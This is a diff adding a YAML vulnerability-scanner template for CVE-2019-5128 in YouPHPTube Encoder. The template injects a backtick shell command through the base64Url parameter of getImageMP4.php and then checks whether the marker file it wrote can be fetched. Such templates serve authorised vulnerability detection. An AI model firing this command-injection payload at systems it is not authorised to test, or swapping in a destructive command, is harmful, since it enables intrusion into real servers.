@@ -1,0 +1,27 @@
+detail:
+  author: 0x_zmz(github.com/0x-zmz)
+  links:
+  - https://xz.aliyun.com/t/6708
+expression: r0() && r1()
+manual: true
+name: poc-yaml-youphptube-encoder-cve-2019-5128
+rules:
+  r0:
+    expression: response.status == 200
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /objects/getImageMP4.php?base64Url={{payload}}&format=jpg
+  r1:
+    expression: response.status == 200 && response.body.bcontains(bytes(content))
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /objects/{{fileName}}
+set:
+  content: randomLowercase(8)
+  fileName: randomLowercase(4) + ".txt"
+  payload: urlencode(base64("`echo " + content + " > " + fileName + "`"))
+transport: http
